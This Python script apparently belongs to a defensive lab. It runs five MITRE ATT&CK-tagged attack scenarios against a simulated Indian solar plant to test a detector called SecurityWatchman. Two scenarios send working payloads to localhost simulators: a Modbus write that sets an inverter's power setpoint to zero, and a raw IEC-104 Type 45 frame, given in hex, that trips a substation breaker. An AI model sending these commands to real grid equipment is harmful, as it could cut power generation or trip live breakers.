"""
run_attacks.py - Automated Attack Scenario Execution Suite.
Executes the 5 high-impact attack scenarios against the simulated solar plant:
  1. Rogue Laptop Asset Injection (T0846)
  2. Malicious Active Power Curtailment via Modbus (T0831)
  3. 2:00 AM OEM Vendor Maintenance Backdoor Abuse (T0886 / T0889)
  4. IEC-104 Substation Feeder Breaker Trip (T0855)
  5. High-Frequency Modbus Flooding / DoS (T0814)
"""

import time
import socket
import json
from pymodbus.client import ModbusTcpClient
from edge_watchman import SecurityWatchman

def banner():
    print("=" * 70)
    print("  SOLAR PARK ATTACK SIMULATION SUITE - WESTERN GUJARAT ICR")
    print("  Executing 5 Threat Scenarios from Part A Research Report")
    print("=" * 70)

def attack_1_rogue_asset(watchman: SecurityWatchman):
    print("\n[>>>] LAUNCHING SCENARIO 1: Rogue Laptop Asset Injected into ICR Switch")
    print("      Vector: Attacker connects unauthorized laptop to open RJ45 switch port.")
    print("      MITRE ATT&CK for ICS: T0846 (Remote System Discovery)")
    
    # Simulate network packet from rogue device
    watchman.evaluate_packet({
        "src_ip": "192.168.1.99",
        "src_mac": "00:1A:2B:3C:4D:5E",
        "dst_port": 5020,
        "proto": "Ethernet / ARP Scan",
        "function_code": 0
    })
    time.sleep(1.5)

def attack_2_curtailment(watchman: SecurityWatchman):
    print("\n[>>>] LAUNCHING SCENARIO 2: Malicious Active Power Curtailment via Modbus")
    print("      Vector: Unauthorized Modbus FC06 write to Register 40001 (P_set) = 0 kW.")
    print("      MITRE ATT&CK for ICS: T0831 (Manipulation of Control)")
    
    # 1. Physical packet injected into real Inverter 02 (port 5021)
    client = ModbusTcpClient("127.0.0.1", port=5021)
    if client.connect():
        # Write 0 kW to register 4 (P_set)
        try:
            client.write_register(4, 0)
        except TypeError:
            try:
                client.write_register(4, 0, slave=2)
            except Exception:
                pass
        client.close()
        print("      [+] Successfully forced Inverter-02 setpoint to 0 kW via raw Modbus FC06!")

    # 2. Watchman evaluates the packet
    watchman.evaluate_packet({
        "src_ip": "192.168.1.99",
        "src_mac": "00:1A:2B:3C:4D:5E",
        "dst_port": 5021,
        "proto": "Modbus TCP",
        "function_code": 6,
        "register": 4,
        "value": 0
    })
    time.sleep(1.5)

def attack_3_vendor_abuse(watchman: SecurityWatchman):
    print("\n[>>>] LAUNCHING SCENARIO 3: 2:00 AM OEM Vendor Backdoor Parameter Abuse")
    print("      Vector: Remote login through 4G modem outside maintenance window.")
    print("      MITRE ATT&CK for ICS: T0886 (Remote Services) / T0889 (Modify Parameter)")
    
    watchman.evaluate_packet({
        "src_ip": "10.45.12.8",
        "src_mac": "C8:47:8C:FA:33:12",
        "dst_port": 5020,
        "proto": "Modbus TCP",
        "function_code": 16,
        "register": 5,
        "value": 90,
        "time_of_day": "02:15"  # 2:15 AM
    })
    time.sleep(1.5)

def attack_4_iec104_trip(watchman: SecurityWatchman):
    print("\n[>>>] LAUNCHING SCENARIO 4: IEC-104 Substation Feeder Breaker Trip")
    print("      Vector: Spoofed SLDC Type 45 C_SC_NA_1 single command to trip 33 kV breaker.")
    print("      MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)")

    # 1. Send actual IEC-104 frame to simulated RTU on port 2404
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 2404))
        # Send STARTDT act
        s.sendall(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        s.recv(1024)

        # Send Type 45 Trip Breaker (IOA 10, Value 0x81: Execute + Trip)
        trip_frame = bytes.fromhex("680E000000002D01060001000A000081")
        s.sendall(trip_frame)
        s.recv(1024)
        s.close()
        print("      [+] Transmitted raw IEC-104 Type 45 APDU -> Pooling Substation Breaker TRIPPED!")
    except Exception as e:
        print(f"      [-] IEC-104 socket error: {e}")

    # 2. Watchman evaluates telemetry
    watchman.evaluate_packet({
        "src_ip": "192.168.1.99",
        "src_mac": "00:1A:2B:3C:4D:5E",
        "dst_port": 2404,
        "proto": "IEC 60870-5-104",
        "asdu_type": 45,
        "ioa": 10,
        "cmd_val": 0x81
    })
    time.sleep(1.5)

def attack_5_modbus_flood(watchman: SecurityWatchman):
    print("\n[>>>] LAUNCHING SCENARIO 5: High-Frequency Modbus Flooding / Denial of Service")
    print("      Vector: High-rate malformed packet burst saturating inverter RTOS TCP queue.")
    print("      MITRE ATT&CK for ICS: T0814 (Denial of Service)")
    
    watchman.evaluate_packet({
        "src_ip": "192.168.1.99",
        "src_mac": "00:1A:2B:3C:4D:5E",
        "dst_port": 5020,
        "proto": "Modbus TCP",
        "flood_rate": 250  # 250 pkts/s
    })
    time.sleep(1.5)

def run_all_attacks():
    banner()
    watchman = SecurityWatchman()
    # Load existing state if available
    try:
        with open("watchman_state.json", "r") as f:
            state = json.load(f)
            watchman.inventory = state.get("inventory", watchman.inventory)
            watchman.alerts = state.get("alerts", [])
    except Exception:
        pass

    attack_1_rogue_asset(watchman)
    attack_2_curtailment(watchman)
    attack_3_vendor_abuse(watchman)
    attack_4_iec104_trip(watchman)
    attack_5_modbus_flood(watchman)

    print("\n" + "=" * 70)
    print("  [SUCCESS] All 5 Attack Scenarios Executed and Caught by Security Watchman!")
    print("  Check the Streamlit Dashboard to view the live alerts and incident triage.")
    print("=" * 70)

if __name__ == "__main__":
    run_all_attacks()
